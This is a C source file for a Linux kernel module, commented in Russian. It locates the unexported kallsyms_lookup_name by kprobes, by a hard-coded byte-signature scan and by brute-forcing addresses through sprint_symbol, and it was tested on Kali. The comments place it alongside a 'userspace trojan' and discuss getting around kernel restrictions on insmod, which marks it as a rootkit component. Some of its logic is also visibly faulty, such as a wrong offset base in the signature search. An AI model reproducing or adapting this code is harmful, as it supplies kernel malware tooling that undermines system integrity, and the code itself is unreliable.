#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kernel_read_file.h>

//#define KPROBES_HAVE 1

#define SYM_FIND_START_LOW	sprint_symbol	//из экспортируемых ближе всего расположена к началу загрузки кода ядра(symbol-"_text")
#define SYM_FIND_START_POINT	filp_close	// "tcp_close"/"close_fd"/"file_close_fd" .. any exportable(by VMLINUX) symb_lol!!!
#define SYM_FIND_RANGE		0x300000	//range back from addr(from which we find pattern). !!!depends on SYM_START_POIN!!!

#ifdef KPROBES_HAVE
	#include <linux/kprobes.h>
#endif

#define SIGNATURE_FUNC	0x53, 0x48, 0x83, 0xec, 0x10, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x28, 0, 0, 0, \
			0x48, 0x89, 0x44, 0x24, 0x08, 0x31, 0xc0, 0x80, 0x3f, 0, 0xc7, 0x44, 0x24, 0x04, 0, 0, 0, 0, \
			0x75, 0x1e, 0x48, 0x8b, 0x54, 0x24, 0x08, 0x65, 0x48, 0x2b, 0x14, 0x25, 0x28, 0, 0, 0, \
			0x0f, 0x85, 0x83, 0, 0, 0, 0x48, 0x83, 0xc4, 0x10, 0x5b, 0xe9, 0x12, 0x78, 0xd4, 0, \
			0x31, 0xd2, 0x48
extern int SYM_FIND_START_POINT(struct file *, fl_owner_t);
extern int SYM_FIND_START_LOW(char *buf, unsigned long addr);
/*
 * Находит адрес(в RAM) символа из symbols_table linux kernel, 
 * вызывая функцию sym2addr(const char *name);
 * 	sym2addr() ищет адреса символов, вызывая kalls_lookup_name(const char *name),
 * 	но её адрес надо как-то найти: 
 * 		1. register_kprobe(struct kprobe *kp): использует интерфейс ядра KPROBES.
 * 			!!! НЕ ДАЁТ некоторые адреса !!!;
 *
 * 		2. get_sym_sprintf(char *name, unsigned long range): использует всегда
 * 			экспортируемую функцию sprintf_symbol(). Вычисляет(какой может) 
 * 			минимальный адрес загрузки ядра(kernTxTbase())->передаёт подряд 
 * 			с текущей позиции адреса в sprintf_symbol()->а она рассказывает,
 * 			какому символу соответствует адрес, или ошибка.Так ищет в цикле...;
 *
 * 		3. get_sym_sign(char *pattern, int size_pattern): ищет сигнатуру в заданном
 * 			диапазоне относительно адреса(до/после) всегда экспортируемой 
 * 			функции filp_close();
 *
 * 		4. get_sym_procfs(char *name): !!НАДО ДОПИСАТЬ!!Проблема: ядро палит, что
 * 			модуль запущен процессом insmod, и запрещает читать некоторые файлы.
 * 			Суть: просто читать /proc/kallsyms из модуля ядра.
 *		
 *		5. Можно: a) НАПИСАТЬ, чтобы в модуль передавались параметры с нужным адресом...
 *			  b) через "call_userhelper_...()" читать из "/proc/kallsyms"
 *			  c) попросить userspace трояна прочитать и передать(1001 способ)
 *			  d) ПОПРОБОВАТЬ запустить поток(USR/KRN) из ядра, чтобы читал "/proc/kallsyms"
 *
 * TESTED kernel virsion: 6.8.11-amd64(kali linux)
 */
unsigned long sym2addr(const char *name);
static int byt2byt(void *where, int size_where, void *pattern, int size_pattern);
static unsigned long kernTxTbase(void);
unsigned long sym2addr(const char *name);
static unsigned long SignInRange(unsigned long start, unsigned long range, char *pattern, int size_pattern);
static unsigned long get_find_sym(void);
static unsigned long get_sym_procfs(char *name);
static unsigned long get_sym_sprintf(char *name, unsigned long range);
static unsigned long get_sym_sign(char *pattern, int size_pattern);

static unsigned long (*find_sym)(const char *name) = NULL;		//Will be "kallsyms_lookup_name()"
static char sign_kallsyms_lookup_name[] = {SIGNATURE_FUNC};		//signature in linux kernel

static int byt2byt(void *where_src, int size_where, void *pattern_src, int size_pattern) {
	if(!where_src || !pattern_src || (size_where<=0) || (size_pattern<=0) ) return -1;
	char *where = where_src;
	char *pattern = pattern_src;

	for(int i=0; i<size_where; i++) {
		for(int g=0; g<size_pattern; g++) {
			if(where[i+g]==pattern[g]) {
				if(g==size_pattern-1) {
					return i;
				}
				continue;
			}
			break;
		}
	}
	return -1;
}

static unsigned long kernTxTbase(void) {

	unsigned long base = (unsigned long)SYM_FIND_START_LOW;
	base &= 0xFFFFFFFFFFE00000;		
	return base;
}
static unsigned long get_sym_sprintf(char *name, unsigned long range) {
	char *fname;
	char *curr_name;
	unsigned long base = kernTxTbase();
	int flen = strlen(name)+5;

	curr_name = kmalloc(8*26, GFP_KERNEL);
	if(!curr_name) return 0;
	fname = kmalloc(flen+8, GFP_KERNEL);
	if(!fname) goto gs_end; 

	strcpy(fname, name);
	strcat(fname, "+0x0/");
	range += base;

	for(; base<=range; base+=0x10) {
		sprint_symbol(curr_name, base);
	//	printk(KERN_INFO "range==%lx||base==%lx||curr_name(%s)|\n", range, base, curr_name);
		if(strncmp(curr_name, fname, flen) == 0) {
			kfree(curr_name);
			kfree(fname);
			return base;
		}
	}

	kfree(fname);
gs_end:
	kfree(curr_name);
	return 0;
}

static unsigned long SignInRange(unsigned long start, unsigned long range, char *pattern, int size_pattern) {
	
	long target = 0;
	unsigned long from = 0;
	
	from = start - range; //SYM_FIND_RANGE;
	from &= (unsigned long)0xFFFFFFFFFFF00000;

	target = byt2byt((void*)from, start-from, (void*)pattern, size_pattern);
	if(target>=0) return target+from;

	target = byt2byt((void*)start, range, (void*)pattern, size_pattern);
	if(target>=0) return target+from;

	return 0;
}

static unsigned long get_sym_sign(char *pattern, int size_pattern) {
	return SignInRange((unsigned long)SYM_FIND_START_POINT, SYM_FIND_RANGE, pattern, size_pattern);

}
static unsigned long get_sym_procfs(char *name) {
/*
	void *data = NULL;
	char *path = "/proc/kallsyms";
	size_t fsize = 0;

	int a = kernel_read_file_from_path(path, 0, &data, 0, &fsize, READING_POLICY);
	//printk(KERN_INFO "ret==%x|size==%x|data(%s)\n", a, fsize, data);
	kfree(data);
	if(a<=0) return 0;
*/
	return 0;
}
static unsigned long get_find_sym(void) {
		char *need_name = "kallsyms_lookup_name";
	#ifdef KPROBES_HAVE
		struct kprobe kp = {
			.symbol_name = need_name,
		};

	//printk(KERN_INFO "	find by kprobe...\n");
		if(register_kprobe(&kp) < 0) return 0;

		find_sym = (unsigned long(*)(const char *name))kp.addr;
		unregister_kprobe(&kp);
		if(find_sym==-1) find_sym = 0;
	#else
	//printk(KERN_INFO "	find by Signature...\n");
		find_sym = (unsigned long(*)(const char *name))get_sym_sign(sign_kallsyms_lookup_name, sizeof(sign_kallsyms_lookup_name));
		if(find_sym) return (unsigned long)find_sym;
	//printk(KERN_INFO "	find by sprint_symbol()...\n");
		find_sym = (unsigned long(*)(const char *name))get_sym_sprintf(need_name, 0x200000);
		if(find_sym) return (unsigned long)find_sym;
	//printk(KERN_INFO "	find by procfs...\n");
		find_sym = (unsigned long(*)(const char *name))get_sym_procfs(need_name);
		//if(find_sym) return find_sym;
	#endif
	return (unsigned long)find_sym;
}

unsigned long sym2addr(const char *name) {

	if(!find_sym) {
		get_find_sym();
	}
	if(name && find_sym) return find_sym(name);

	return 0;
}
